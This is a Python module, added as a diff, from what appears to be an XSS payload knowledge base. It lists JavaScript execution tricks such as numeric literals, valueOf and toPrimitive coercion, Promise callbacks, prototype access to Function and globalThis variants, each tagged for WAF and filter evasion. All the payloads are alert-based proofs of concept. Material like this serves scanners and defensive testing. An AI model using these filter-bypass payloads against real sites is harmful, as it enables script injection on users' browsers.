@@ -1,0 +1,342 @@
+#!/usr/bin/env python3
+"""
+Project: BRS-KB (BRS XSS Knowledge Base)
+Company: EasyProTech LLC (www.easypro.tech)
+Dev: Brabus
+Date: 2025-12-27 UTC
+Status: Refactored
+Telegram: https://t.me/EasyProTech
+
+Deep Memory XSS Payloads - Part 4
+Number formats, Object constructors, Error handling, Location tricks, Prototype pollution, Symbols, Promises, and Global variations.
+"""
+
+from ..models import PayloadEntry
+
+
+BRS_KB_DEEP_MEMORY_PAYLOADS_PART4 = {
+    # ============================================================
+    # QUIRKY NUMBER FORMATS
+    # ============================================================
+    "number-scientific": PayloadEntry(
+        payload="alert(1e1/1e1)",
+        contexts=["javascript"],
+        severity="high",
+        cvss_score=7.5,
+        description="Scientific notation",
+        tags=["number", "scientific"],
+        bypasses=["number_filters"],
+        waf_evasion=True,
+        browser_support=["chrome", "firefox", "safari", "edge"],
+        reliability="high",
+    ),
+    "number-hex": PayloadEntry(
+        payload="alert(0x1)",
+        contexts=["javascript"],
+        severity="high",
+        cvss_score=7.5,
+        description="Hexadecimal number",
+        tags=["number", "hex"],
+        bypasses=["number_filters"],
+        waf_evasion=True,
+        browser_support=["chrome", "firefox", "safari", "edge"],
+        reliability="high",
+    ),
+    "number-octal": PayloadEntry(
+        payload="alert(0o1)",
+        contexts=["javascript"],
+        severity="high",
+        cvss_score=7.5,
+        description="Octal number (ES6)",
+        tags=["number", "octal"],
+        bypasses=["number_filters"],
+        waf_evasion=True,
+        browser_support=["chrome", "firefox", "safari", "edge"],
+        reliability="high",
+    ),
+    "number-binary": PayloadEntry(
+        payload="alert(0b1)",
+        contexts=["javascript"],
+        severity="high",
+        cvss_score=7.5,
+        description="Binary number (ES6)",
+        tags=["number", "binary"],
+        bypasses=["number_filters"],
+        waf_evasion=True,
+        browser_support=["chrome", "firefox", "safari", "edge"],
+        reliability="high",
+    ),
+    "number-underscore": PayloadEntry(
+        payload="alert(1_000)",
+        contexts=["javascript"],
+        severity="high",
+        cvss_score=7.5,
+        description="Numeric separator",
+        tags=["number", "underscore"],
+        bypasses=["number_filters"],
+        waf_evasion=True,
+        browser_support=["chrome", "firefox", "safari", "edge"],
+        reliability="high",
+    ),
+    # ============================================================
+    # OBJECT CONSTRUCTOR TRICKS
+    # ============================================================
+    "object-valueOf": PayloadEntry(
+        payload="+{valueOf:alert}",
+        contexts=["javascript"],
+        severity="high",
+        cvss_score=7.5,
+        description="Object valueOf coercion",
+        tags=["object", "valueOf"],
+        bypasses=["object_filters"],
+        waf_evasion=True,
+        browser_support=["chrome", "firefox", "safari", "edge"],
+        reliability="high",
+    ),
+    "object-toString": PayloadEntry(
+        payload='({toString:alert})+""',
+        contexts=["javascript"],
+        severity="high",
+        cvss_score=7.5,
+        description="Object toString coercion",
+        tags=["object", "toString"],
+        bypasses=["object_filters"],
+        waf_evasion=True,
+        browser_support=["chrome", "firefox", "safari", "edge"],
+        reliability="high",
+    ),
+    "object-toPrimitive": PayloadEntry(
+        payload="+{[Symbol.toPrimitive]:alert}",
+        contexts=["javascript"],
+        severity="high",
+        cvss_score=7.5,
+        description="Symbol.toPrimitive coercion",
+        tags=["object", "symbol"],
+        bypasses=["object_filters"],
+        waf_evasion=True,
+        browser_support=["chrome", "firefox", "safari", "edge"],
+        reliability="high",
+    ),
+    # ============================================================
+    # ERROR HANDLING TRICKS
+    # ============================================================
+    "error-stack-leak": PayloadEntry(
+        payload="try{throw 1}catch(e){alert(new Error().stack)}",
+        contexts=["javascript"],
+        severity="medium",
+        cvss_score=6.0,
+        description="Error stack trace leak",
+        tags=["error", "stack"],
+        bypasses=["error_filters"],
+        waf_evasion=True,
+        browser_support=["chrome", "firefox", "safari", "edge"],
+        reliability="high",
+    ),
+    "error-cause-chain": PayloadEntry(
+        payload="throw new Error('x',{cause:alert(1)})",
+        contexts=["javascript"],
+        severity="high",
+        cvss_score=7.5,
+        description="Error cause option execution",
+        tags=["error", "cause"],
+        bypasses=["error_filters"],
+        waf_evasion=True,
+        browser_support=["chrome", "firefox", "safari", "edge"],
+        reliability="high",
+    ),
+    # ============================================================
+    # LOCATION TRICKS
+    # ============================================================
+    "location-protocol-trick": PayloadEntry(
+        payload="location.protocol='javascript:'",
+        contexts=["javascript"],
+        severity="high",
+        cvss_score=7.5,
+        description="Location protocol assignment",
+        tags=["location", "protocol"],
+        bypasses=["location_filters"],
+        waf_evasion=True,
+        browser_support=["chrome", "firefox"],
+        reliability="low",
+    ),
+    "location-search-inject": PayloadEntry(
+        payload="location.search='?<script>alert(1)</script>'",
+        contexts=["javascript"],
+        severity="high",
+        cvss_score=7.5,
+        description="Location search manipulation",
+        tags=["location", "search"],
+        bypasses=["location_filters"],
+        waf_evasion=True,
+        browser_support=["chrome", "firefox", "safari", "edge"],
+        reliability="medium",
+    ),
+    # ============================================================
+    # ARRAY PROTOTYPE POLLUTION
+    # ============================================================
+    "array-proto-push": PayloadEntry(
+        payload="Array.prototype.push=function(){alert(1)}",
+        contexts=["javascript"],
+        severity="high",
+        cvss_score=7.5,
+        description="Array prototype pollution",
+        tags=["prototype", "pollution", "array"],
+        bypasses=["prototype_filters"],
+        waf_evasion=True,
+        browser_support=["chrome", "firefox", "safari", "edge"],
+        reliability="high",
+    ),
+    "object-proto-constructor": PayloadEntry(
+        payload="({}).__proto__.constructor.constructor('alert(1)')()",
+        contexts=["javascript"],
+        severity="critical",
+        cvss_score=8.5,
+        description="Object prototype to Function",
+        tags=["prototype", "pollution", "function"],
+        bypasses=["prototype_filters"],
+        waf_evasion=True,
+        browser_support=["chrome", "firefox", "safari", "edge"],
+        reliability="high",
+    ),
+    # ============================================================
+    # WELL-KNOWN SYMBOLS
+    # ============================================================
+    "symbol-hasInstance": PayloadEntry(
+        payload="{[Symbol.hasInstance]:()=>alert(1)}instanceof Function",
+        contexts=["javascript"],
+        severity="high",
+        cvss_score=7.5,
+        description="Symbol.hasInstance hook",
+        tags=["symbol", "hasInstance"],
+        bypasses=["symbol_filters"],
+        waf_evasion=True,
+        browser_support=["chrome", "firefox", "safari", "edge"],
+        reliability="high",
+    ),
+    "symbol-species": PayloadEntry(
+        payload="class X extends Array{static get[Symbol.species](){return alert,Array}};new X().map(x=>x)",
+        contexts=["javascript"],
+        severity="high",
+        cvss_score=7.5,
+        description="Symbol.species hook",
+        tags=["symbol", "species"],
+        bypasses=["class_filters"],
+        waf_evasion=True,
+        browser_support=["chrome", "firefox", "safari", "edge"],
+        reliability="high",
+    ),
+    # ============================================================
+    # PROMISE TRICKS
+    # ============================================================
+    "promise-then-chain": PayloadEntry(
+        payload="Promise.resolve().then(alert)",
+        contexts=["javascript"],
+        severity="high",
+        cvss_score=7.5,
+        description="Promise then chain execution",
+        tags=["promise", "then"],
+        bypasses=["promise_filters"],
+        waf_evasion=True,
+        browser_support=["chrome", "firefox", "safari", "edge"],
+        reliability="high",
+    ),
+    "promise-catch-execution": PayloadEntry(
+        payload="Promise.reject().catch(()=>alert(1))",
+        contexts=["javascript"],
+        severity="high",
+        cvss_score=7.5,
+        description="Promise catch execution",
+        tags=["promise", "catch"],
+        bypasses=["promise_filters"],
+        waf_evasion=True,
+        browser_support=["chrome", "firefox", "safari", "edge"],
+        reliability="high",
+    ),
+    "promise-finally": PayloadEntry(
+        payload="Promise.resolve().finally(()=>alert(1))",
+        contexts=["javascript"],
+        severity="high",
+        cvss_score=7.5,
+        description="Promise finally execution",
+        tags=["promise", "finally"],
+        bypasses=["promise_filters"],
+        waf_evasion=True,
+        browser_support=["chrome", "firefox", "safari", "edge"],
+        reliability="high",
+    ),
+    "promise-allSettled": PayloadEntry(
+        payload="Promise.allSettled([1]).then(()=>alert(1))",
+        contexts=["javascript"],
+        severity="high",
+        cvss_score=7.5,
+        description="Promise.allSettled callback",
+        tags=["promise", "allSettled"],
+        bypasses=["promise_filters"],
+        waf_evasion=True,
+        browser_support=["chrome", "firefox", "safari", "edge"],
+        reliability="high",
+    ),
+    "promise-any": PayloadEntry(
+        payload="Promise.any([1]).then(()=>alert(1))",
+        contexts=["javascript"],
+        severity="high",
+        cvss_score=7.5,
+        description="Promise.any callback",
+        tags=["promise", "any"],
+        bypasses=["promise_filters"],
+        waf_evasion=True,
+        browser_support=["chrome", "firefox", "safari", "edge"],
+        reliability="high",
+    ),
+    # ============================================================
+    # GLOBAL THIS VARIATIONS
+    # ============================================================
+    "global-this-alert": PayloadEntry(
+        payload="globalThis.alert(1)",
+        contexts=["javascript"],
+        severity="high",
+        cvss_score=7.5,
+        description="globalThis access",
+        tags=["global", "globalThis"],
+        bypasses=["window_filters"],
+        waf_evasion=True,
+        browser_support=["chrome", "firefox", "safari", "edge"],
+        reliability="high",
+    ),
+    "global-frames": PayloadEntry(
+        payload="frames.alert(1)",
+        contexts=["javascript"],
+        severity="high",
+        cvss_score=7.5,
+        description="frames window access",
+        tags=["global", "frames"],
+        bypasses=["window_filters"],
+        waf_evasion=True,
+        browser_support=["chrome", "firefox", "safari", "edge"],
+        reliability="high",
+    ),
+    "global-self": PayloadEntry(
+        payload="self.alert(1)",
+        contexts=["javascript"],
+        severity="high",
+        cvss_score=7.5,
+        description="self window access",
+        tags=["global", "self"],
+        bypasses=["window_filters"],
+        waf_evasion=True,
+        browser_support=["chrome", "firefox", "safari", "edge"],
+        reliability="high",
+    ),
+    "global-content": PayloadEntry(
+        payload="content?.alert?.(1)",
+        contexts=["javascript"],
+        severity="high",
+        cvss_score=7.5,
+        description="content window (Firefox)",
+        tags=["global", "content"],
+        bypasses=["window_filters"],
+        waf_evasion=True,
+        browser_support=["firefox"],
+        reliability="low",
+    ),
+}
